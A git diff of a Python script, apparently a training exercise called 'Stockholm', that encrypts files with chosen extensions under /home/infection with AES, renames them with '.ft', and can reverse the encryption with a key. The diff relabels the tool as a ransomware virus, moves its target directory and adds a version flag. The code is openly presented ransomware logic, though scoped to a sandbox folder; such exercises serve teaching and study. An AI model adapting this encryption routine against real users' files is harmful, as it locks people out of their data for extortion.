@@ -26,11 +26,13 @@ extensions = [
 ]
 #cifrado simétrico AES (Advanced Encryption Standard)
 
-parser = argparse.ArgumentParser(description='Generate TOTP key')
+parser = argparse.ArgumentParser(description='This program executes a ransomware virus in /home/infection')
 
 parser.add_argument('-r', '--reverse', type=str)
 parser.add_argument('-k', '--genkey')
 parser.add_argument('-s', '--silent', action='store_true')
+parser.add_argument('-v', '--version', action='store_true')
+
 args = parser.parse_args()    
 
 def genkey():
@@ -48,6 +50,7 @@ def encript_file(filename):
         with open(filename, 'wb') as enc_file:
             enc_file.write(enc_data)
         os.rename(filename, filename + '.ft')
+        print(filename + " has been encripted")
     except:
         pass
     
@@ -66,7 +69,7 @@ if args.genkey:
 
 
 
-dirpath = 'cositas/'
+dirpath = '/home/infection/'
 
 def getfiles(dirpath):
     filelist = os.listdir(dirpath)
@@ -78,8 +81,8 @@ def getfiles(dirpath):
             unencript_file(totalname, args.reverse)
         else:
             if not os.path.isdir(totalname) and not args.silent:
-                print(totalname + " has been encripted")
-            if totalname.endswith(tuple(extensions)):
-            	encript_file(totalname)
-
+                if totalname.endswith(tuple(extensions)):
+                    encript_file(totalname)
 getfiles(dirpath)
+if args.version:
+	print("Stockholm Version 1.0")
